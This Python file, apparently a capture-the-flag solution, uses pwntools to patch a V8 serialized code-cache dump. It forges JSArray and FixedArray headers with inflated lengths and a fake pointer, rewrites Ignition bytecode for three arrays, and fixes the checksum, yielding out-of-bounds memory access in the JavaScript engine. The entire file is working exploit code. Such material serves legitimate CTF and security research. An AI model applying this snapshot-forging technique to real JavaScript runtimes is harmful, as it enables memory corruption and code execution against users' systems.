# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
import zlib

dat = bytearray(open('dumpc', 'rb').read())

fst_s = dat.find(b'\x01\x0c\x92')
fst_e = dat.find(b'\x66\x66\x66\x66\x66\x66\xfe\x3f', fst_s) + 8
snd_s = dat.find(b'\x01\x0c\x92', fst_e)
snd_e = dat.find(b'\x66\x66\x66\x66\x66\x66\xfe\x3f', snd_s) + 8
thd_s = dat.find(b'\x01\x0c\x92', snd_e)
thd_e = dat.find(b'\x66\x66\x66\x66\x66\x66\xfe\x3f', thd_s) + 8
print(fst_s, fst_e, snd_s, snd_e, thd_s, thd_e)

# Double JSArray
typ = b'\x01\x28\x4a\x68' + b'\x04\x04\x04\x18' + \
    b'\x38\x08\x00\x11' + b'\xff\x07\x00\x0a' + b'\x00\x00\x00\x00' * 6
# Obj JSArray
typ_a = b'\x01\x28\x4a\x68' + b'\x04\x04\x04\x18' + \
    b'\x38\x08\x00\x09' + b'\xff\x07\x00\x0a' + b'\x00\x00\x00\x00' * 6

fxa = b'\x01\x08\x4c\x60\x00\x00\x00\x00'
da = b'\x01\x10\x07\xb4\x62' + p32(0x1000 * 2) + p64(0xdeadbeef)
fxa2 = b'\x01\x18\x4c\x64' + p32(0x1000 * 2) + p32(0x0) * 4
le = b'\x60' + p32(0x1000 * 2)

fst_p = b'\x01\x10' + typ + fxa + da + le
snd_p = fst_p
thd_p = b'\x01\x10' + typ_a + fxa + fxa2 + le

dat[fst_s:fst_e] = b'\x0b' * (fst_e - fst_s)
dat[fst_s:fst_s + len(fst_p)] = fst_p
dat[snd_s:snd_e] = b'\x0b' * (snd_e - snd_s)
dat[snd_s:snd_s + len(snd_p)] = snd_p
dat[thd_s:thd_e] = b'\x0b' * (thd_e - thd_s)
dat[thd_s:thd_s + len(thd_p)] = thd_p

# Locate the Ignition bytecode
code_s = dat.find(b'\x79\x02\x05\x25', thd_e)
# Patch array x
dat[code_s:code_s + 4] = b'\x0f' * 2 + b'\x13' + p8(2)
# Patch array y
dat[code_s + 6:code_s + 10] = b'\x0f' * 2 + b'\x13' + p8(3)
# Patch array z
dat[code_s + 12:code_s + 16] = b'\x0f' * 2 + b'\x13' + p8(4)

# Patch checksums
dat[8:12] = p32(0)
dat[20:24] = p32(zlib.adler32(dat[24:], 0))

open('dumpcp', 'wb').write(dat)
